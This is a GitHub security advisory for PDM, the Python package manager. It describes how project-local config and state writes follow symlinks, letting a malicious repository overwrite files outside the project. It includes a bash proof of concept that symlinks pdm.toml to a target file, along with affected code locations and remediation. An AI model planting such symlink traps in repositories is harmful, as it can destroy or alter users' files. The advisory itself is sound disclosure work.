# [M] PDM: Project-Local State and Config Writes Follow Symlinks

## Summary
Severity: Medium
Advisory: GHSA-ghq2-5c67-fprm
CVE: CVE-2026-47763
CWE: CWE-61
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-10
Source: https://github.com/advisories/GHSA-ghq2-5c67-fprm
Type: github-advisory

## Affected
- PyPI: `pdm` — affected >=0 <2.27.0

## Details
## Summary

PDM writes several project-local state or configuration files without symlink protection. If a malicious repository places those files as symlinks, local PDM operations can overwrite the symlink targets.

This creates an arbitrary file clobber primitive relative to the privileges of the invoking user.

## Affected Behavior

- Project-local config writes can affect files outside the repository
- The most stable demonstrated sink is `pdm.toml`
- Related sinks include `.pdm-python` and `.python-version`

## Affected Code

- `src/pdm/project/config.py:303-350`
- `src/pdm/project/core.py:209-217`
- `src/pdm/cli/commands/use.py:187-189`

## Technical Details

`Config.__init__()` resolves the project-local `pdm.toml` path and `_save_config()` writes to the resolved target. If `PROJECT_ROOT/pdm.toml` is a symlink to another file, `pdm config -l ...` updates the target file instead of refusing the write.

The same general problem exists for other project-local persistence paths that are written directly with no `lstat` / `O_NOFOLLOW` protection.

For the `pdm.toml` PoC specifically, the target file must already contain parseable TOML. Otherwise the load step fails before the write path is reached. That parser constraint does not apply to the `.pdm-python` or `.python-version` sinks.

## Impact

- Arbitrary file clobber as the invoking user
- Destructive modification of local files outside the repository root
- Useful primitive for privilege abuse when `pdm` is run in elevated contexts

## Reproduction

PoC:

```bash
# Replace this with a Python interpreter that can run `python -m pdm`.
PDM_PY=/path/to/python-with-pdm
tmpdir=$(mktemp -d)
target="$tmpdir/clobbered-target.toml"

cat > "$target" <<'EOF'
[seed]
value = 1
EOF

ln -s "$target" "$tmpdir/pdm.toml"

cat > "$tmpdir/pyproject.toml" <<'EOF'
[project]
name = "symlink-clobber-demo"
version = "0.0.1"
EOF

(
  cd "$tmpdir" &&
  "$PDM_PY" -m pdm config -l venv.in_project false
)

cat "$target"
```

Expected result:

- A temporary project is created
- `pdm.toml` is a symlink to another TOML file
- Running `pdm config -l venv.in_project false` modifies the symlink target

Observed output from local validation:

```text
--- target ---
[seed]
value = 1

[venv]
in_project = false
```

## Severity

Medium

## CVSS v4.0

- Base score: `6.8` (`Medium`)
- Vector: `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N`

Rationale:

- `AV:L`: exploitation requires local execution of `pdm` against an attacker-prepared checkout
- `AC:L`: there is no complex constraint once the symlink sink exists
- `AT:N`: no extra prerequisite beyond the victim running the relevant command is required
- `PR:N`: the attacker does not need prior privileges on the victim system
- `UI:A`: the victim must actively run a command that writes project-local state or config
- `VC:N`: the demonstrated issue is a write primitive, not a direct read primitive
- `VI:H`: the attacker can cause unauthorized modification of files outside the repository root
- `VA:L`: file clobber can disrupt local operation, but direct same-step availability impact is lower than a full RCE
- `SC:N/SI:N/SA:N`: the base score is limited to the directly affected system

## Root Cause

Project-local file sinks are treated as trusted regular files and are written without symlink checks or guarded atomic replacement.

## Recommended Remediation

- Refuse to write project-local config/state files when the destination is a symlink
- Use `lstat` and `O_NOFOLLOW` where available
- Avoid resolving attacker-controlled project-local paths before writing
- Use atomic temp-file replacement only after confirming the destination is a regular file

## Disclosure Notes

This issue is independent from the code-execution issues above. It is best tracked as a separate CVE candidate because the root cause and remediation are different.

## References
- https://github.com/pdm-project/pdm/security/advisories/GHSA-ghq2-5c67-fprm
- https://github.com/pdm-project/pdm
- https://github.com/pdm-project/pdm/releases/tag/2.27.0
